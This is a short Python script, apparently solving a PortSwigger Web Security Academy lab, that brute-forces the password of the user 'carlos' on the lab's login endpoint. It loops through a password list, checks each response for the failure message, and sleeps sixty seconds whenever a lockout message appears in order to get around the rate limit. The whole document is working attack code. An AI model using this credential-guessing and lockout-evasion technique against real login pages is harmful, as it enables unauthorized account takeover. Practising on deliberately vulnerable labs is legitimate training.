import requests
import re
import time
import json

passwords = open("passwords.txt","r")

for i in passwords:
	data = {"username":"carlos","password":i.strip()}
	respuesta = requests.post("https://0a3700490498654984d7b95f00540028.web-security-academy.net/login", json=data)
	coincidencia = re.findall("Invalid username or password.",respuesta.text)
	coincidencia1= re.findall("You have made too many incorrect login attempts.",respuesta.text)
	if coincidencia == [] and coincidencia1 == []:
		print("Password encontrado: "+i.strip())
		quit()
	if coincidencia1 != []:
		time.sleep(60)
	 	
